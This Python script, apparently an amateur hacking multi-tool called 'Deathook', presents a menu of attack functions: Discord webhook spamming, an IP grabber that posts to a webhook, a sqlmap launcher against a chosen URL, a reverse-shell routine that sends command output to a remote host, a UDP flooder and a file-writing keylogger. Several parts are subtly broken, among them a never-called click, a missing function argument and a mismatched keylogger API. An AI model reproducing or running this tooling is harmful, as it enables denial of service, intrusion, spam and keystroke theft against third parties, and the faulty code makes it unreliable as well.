import requests
import random
import string
import exifread
import subprocess
import socket
import random
import argparse
import pyautogui
import time
import discord
import keyboard

webhooks = []  

def add_webhook():
    """Function to add a webhook URL to the list"""
    webhook = input("Enter the webhook URL: ")
    webhooks.append(webhook)
    print("Webhook added successfully!")

def send_message():
    """Function to send a message to all webhooks"""
    message = input("Enter the message to send: ")
    for webhook in webhooks:
        response = requests.post(webhook, json={"content": message})
        if response.status_code == 204:
            print("Message sent successfully to", webhook)
        else:
            print("Failed to send message to", webhook)
            print("Status code:", response.status_code)
            print("Response text:", response.text)

def generate_password():
    """Function to generate a random password"""
    password_length = int(input("Enter the length of the password: "))
    password = "".join(random.choices(string.ascii_letters + string.digits, k=password_length))
    print("Generated password:", password)
   
def spam_messages():
    """Function to spam messages to all webhooks"""
    message = input("Enter the message to spam: ")
    num_messages = int(input("Enter the number of messages to spam: "))
    for i in range(num_messages):
        for webhook in webhooks:
            requests.post(webhook, json={"content": message})
    print(f"{num_messages} messages spammed to all webhooks")

def search_phone_number():
    """Function to search for information about a phone number using PhoneInfoga"""
    phone_number = input("Enter the phone number to search: ")
    response = requests.get(f"https://api.phoneinfoga.com/v1/search?number={phone_number}")
    if response.status_code == 200:
        data = response.json()
        print(f"Phone number: {data['number']}")
        print(f"Country: {data['country_name']}")
        print(f"Location: {data['location']}")
        print(f"Carrier: {data['carrier']}")
    else:
        print("An error occurred while searching for the phone number.")

def send_ip_to_webhook():
    """Send the user's IP address to the Discord webhook"""
    # Make a request to the IPify API to get the user's IP address
    response = requests.get("https://api.ipify.org")
    ip_address = response.text
    # Set the request parameters
    data = {
        "content": f"The user's IP address is: {ip_address}"
    }
    # Make a request to the Discord webhook
    for webhook in webhooks:
        requests.post(webhook, json=data)

def extract_exif_metadata():
    """Function to extract EXIF metadata from an image file"""
    # Prompt the user for the file path
    file_path = input("Enter the file path of the image: ")
    # Open the file in binary mode
    with open(file_path, 'rb') as f:
        # Extract the EXIF data
        exif_data = exifread.process_file(f)
        # Print the EXIF data
        print(exif_data)

def view_webhooks():
  """Function to display a list of webhooks"""
  print("Webhooks:")
  for i, webhook in enumerate(webhooks):
    print(f"{i+1}. {webhook}")

def delete_webhook():
  """Function to delete a specific webhook"""
  view_webhooks()
  # Prompt the user for the index of the webhook to delete
  webhook_index = int(input("Enter the index of the webhook to delete: "))
  # Delete the webhook from the list
  del webhooks[webhook_index-1]
  print("Webhook deleted successfully!")

def get_ip_location(ip_address):
  """Function to get the location of an IP address"""
  # Make a request to the IP Geolocation API
  response = requests.get(f"https://ipapi.co/{ip_address}/json/")
  # Check the status code of the response
  if response.status_code == 200:
    # If the request was successful, return the location data
    return response.json()
  else:
    # If the request was not successful, return None
    return None

# Test the function
ip_address = "8.8.8.8"
location = get_ip_location(ip_address)
if location:
  print(f"IP address: {ip_address}")
  print(f"Country: {location['country_name']}")
  print(f"Region: {location['region']}")
  print(f"City: {location['city']}")
else:
  print(f"Unable to get location for IP address: {ip_address}")

def run_sqlmap():
  """Function to run SQLMap"""
  # Prompt the user for the target URL
  target_url = input("Enter the target URL: ")
  # Run SQLMap using the subprocess module
  subprocess.run(["sqlmap", "-u", target_url])

def create_reverse_shell():
  """Function to create a reverse shell"""
  # Create a TCP/IP socket
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  # Connect the socket to the remote host and port
  remote_host = input("Enter the remote host IP address: ")
  remote_port = int(input("Enter the remote host port: "))
  sock.connect((remote_host, remote_port))

  # Create a subprocess to execute a command
  command = input("Enter the command to execute: ")
  process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  # Send the command's output back to the remote host
  while True:
      # Read output from the command
      output = process.stdout.readline()
      # Send the output to the remote host
      sock.send(output)
      # Check if the command has completed
      if process.poll() is not None:
          break

  # Close the socket
  sock.close()

  # Send a Discord webhook with the information from the reverse shell attack
  webhook_url = input("Enter the Discord webhook URL: ")
  data = {
      "content": f"Reverse shell attack launched from host {remote_host} on port {remote_port}\nCommand executed: {command}"
  }
  response = requests.post(webhook_url, json=data)
  if response.status_code == 204:
      print("Webhook sent successfully")
  else:
      print("Error sending webhook")
      print("Status code:", response.status_code)
      print("Response text:", response.text)

      
def udp_flood():
  """Function to launch a UDP flood"""
  # Prompt the user for the target IP address and port
  target = input("Enter the target IP address: ")
  port = int(input("Enter the target port: "))
  packet_size = int(input("Enter the packet size (in bytes): "))
  num_packets = int(input("Enter the number of packets to send: "))

  # Create a UDP socket
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

  # Send UDP packets to the target
  for i in range(num_packets):
      # Generate a random message
      message = ''.join(random.choices(string.ascii_letters + string.digits, k=packet_size))
      # Send the packet to the target
      sock.sendto(message.encode(), (target, port))
      print(f"Sent packet {i + 1}")

  # Close the socket
  sock.close()
 
# Function to start the auto key trigger
def start_auto_key_trigger():
    # Prompt the user for the key to trigger
    key = input("Enter the key to trigger: ")
    # Prompt the user for the delay between triggers (in seconds)
    delay = float(input("Enter the delay between triggers (in seconds): "))
    print("Starting auto key trigger...")
    # Continuously press and release the key
    while True:
        pyautogui.press(key)
        time.sleep(delay)
        pyautogui.release(key)


# Function to start the autoclicker
def start_autoclicker():
    # Prompt the user for the delay between clicks (in seconds)
    delay = float(input("Enter the delay between clicks (in seconds): "))
    print("Starting autoclicker...")
    # Continuously click the mouse
    while True:
        pyautogui.click

def Keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting char")    

async def start_keylogger():
    listener = keyboard.Listener(on_press=Keypressed)
    listener.start()


def print_ascii_art():
    """Function to print ASCII art with a red color"""
    print("\033[91m")  
    print(" _____ _   _ _____ _____ _____ ")
    print("|   __| | | |  |  |   | |   __|")
    print("|__   | | | |  |  | | | |   __|")
    print("|_____|_____|_____|_|___|_____|")
    print("\033[0m")  

def main():
  """Main function with the menu and options"""
  print_ascii_art()  
  print("Made by </> anonymous")  
  print("Welcome to Deathook!")
  print("Menu:")
  print("1. Add a webhook")
  print("2. Send a message to all webhooks")
  print("3. Generate a password")
  print("4. Spam messages to all webhooks")
  print("5. Search for information about a phone number")
  print("6. ip grabber that sends to webhook")
  print("7. Extract EXIF metadata from an image file")
  print("8. View webhooks")
  print("9. Delete a webhook")
  print("10. Look up the location of an IP address")
  print("11. run sqlmap")
  print("12. reverse shell attack")
  print("13. UDP flooder")
  print("14. auto key trigger")
  print("15. autoclicker")
  print("16. keylogger")
  print("0. Exit")
  choice = int(input("\nEnter your choice: "))
  if choice == 1:
      add_webhook()
  elif choice == 2:
      send_message()
  elif choice == 3:
      generate_password()
  elif choice == 4:
      spam_messages()
  elif choice == 5:
      search_phone_number()
  elif choice == 6:
      send_ip_to_webhook()
  elif choice == 7:
      extract_exif_metadata()
  elif choice == 8:
      view_webhooks()
  elif choice == 9:
      delete_webhook()
  elif choice == 10:
      get_ip_location()
  elif choice == 11:
      run_sqlmap()
  elif choice == 12:
      create_reverse_shell()
  elif choice == 13:
      udp_flood()
  elif choice == 14:
      start_auto_key_trigger()
  elif choice == 15:
      start_autoclicker()
  elif choice == 16:
       start_keylogger()
  elif choice == 0:
      exit()
  else:
      print("Invalid choice. Try again.")
  main()

if __name__ == '__main__':
    main()

    main()
